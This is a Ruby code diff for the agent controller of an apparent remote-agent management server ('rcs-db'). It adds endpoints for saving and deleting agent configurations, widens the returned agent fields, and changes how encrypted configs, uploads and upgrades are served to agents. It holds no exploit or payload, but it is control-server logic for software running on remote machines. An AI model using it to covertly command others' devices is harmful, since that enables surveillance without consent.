@@ -1,7 +1,7 @@
 #
 # Controller for the Agent objects
 #
-require 'rcs-db/license'
+require_relative '../license'
 require 'rcs-common/crypt'
 
 module RCS
@@ -19,7 +19,7 @@ class AgentController < RESTController
     mongoid_query do
       items = ::Item.agents.where(filter)
         .any_in(_id: @session[:accessible])
-        .only(:name, :desc, :status, :_kind, :path, :stat)
+        .only(:name, :desc, :status, :_kind, :path, :stat, :type, :platform, :uninstalled)
       
       RESTController.reply.ok(items)
     end
@@ -31,7 +31,7 @@ class AgentController < RESTController
     mongoid_query do
       item = Item.agents
         .any_in(_id: @session[:accessible])
-        .only(:name, :desc, :status, :_kind, :path, :stat, :ident, :upgradable, :group_ids, :counter)
+        .only(:name, :desc, :status, :_kind, :path, :stat, :ident, :instance, :platform, :upgradable, :uninstalled, :deleted, :demo, :type, :version)
         .find(@params['_id'])
 
       RESTController.reply.ok(item)
@@ -74,6 +74,50 @@ class AgentController < RESTController
                 :action => "#{item._kind}.delete",
                 item._kind.to_sym => @params['name'],
                 :desc => "Deleted #{item._kind} '#{item['name']}'"
+      
+      return RESTController.reply.ok
+    end
+  end
+
+ def add_config
+    require_auth_level :tech
+
+    mongoid_query do
+      agent = Item.any_in(_id: @session[:accessible]).where(_kind: 'agent').find(@params['_id'])
+
+      # the config was not sent, replace it
+      if agent.configs.last.sent.nil? or agent.configs.last.sent == 0
+        @params.delete('_id')
+        agent.configs.last.update_attributes(@params)
+        config = agent.configs.last
+      else
+        config = agent.configs.create!(config: @params['config'], desc: @params['desc'])
+      end
+
+      config.saved = Time.now.getutc.to_i
+      config.user = @session[:user][:name]
+      config.save
+
+      Audit.log :actor => @session[:user][:name],
+                :action => "#{agent._kind}.add_config",
+                agent._kind.to_sym => @params['name'],
+                :desc => "Saved configuration for agent '#{agent['name']}'"
+
+      return RESTController.reply.ok(config)
+    end
+  end
+
+  def del_config
+    require_auth_level :tech
+
+    mongoid_query do
+      agent = Item.any_in(_id: @session[:accessible]).where(_kind: 'agent').find(@params['_id'])
+      agent.configs.find(@params['config_id']).destroy
+
+      Audit.log :actor => @session[:user][:name],
+                :action => "#{agent._kind}.del_config",
+                agent._kind.to_sym => @params['name'],
+                :desc => "Deleted configuration for agent '#{agent['name']}'"
       
       return RESTController.reply.ok
     end
@@ -194,7 +238,7 @@ class AgentController < RESTController
         config.save
 
         # encrypt the config for the agent using the confkey
-        enc_config = aes_encrypt(config[:config], Digest::MD5.digest(agent[:confkey]))
+        enc_config = config.encrypted_config(agent[:confkey])
         
         return RESTController.reply.ok(enc_config, {content_type: 'binary/octet-stream'})
         
@@ -227,7 +271,7 @@ class AgentController < RESTController
       when 'GET'
         agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
         upl = agent.upload_requests.where({ _id: @params['upload']}).first
-        content = GridFS.instance.get upl[:_grid].first
+        content = GridFS.get upl[:_grid].first
         trace :info, "[#{@request[:peer]}] Requested the UPLOAD #{@params['upload']} -- #{content.file_length.to_s_bytes}"
         return RESTController.reply.ok(content.read, {content_type: content.content_type})
       when 'DELETE'
@@ -257,7 +301,7 @@ class AgentController < RESTController
       when 'GET'
         agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
         upl = agent.upgrade_requests.where({ _id: @params['upgrade']}).first
-        content = GridFS.instance.get upl[:_grid].first
+        content = GridFS.get upl[:_grid].first
         trace :info, "[#{@request[:peer]}] Requested the UPGRADE #{@params['upgrade']} -- #{content.file_length.to_s_bytes}"
         return RESTController.reply.ok(content.read, {content_type: content.content_type})
       when 'DELETE'
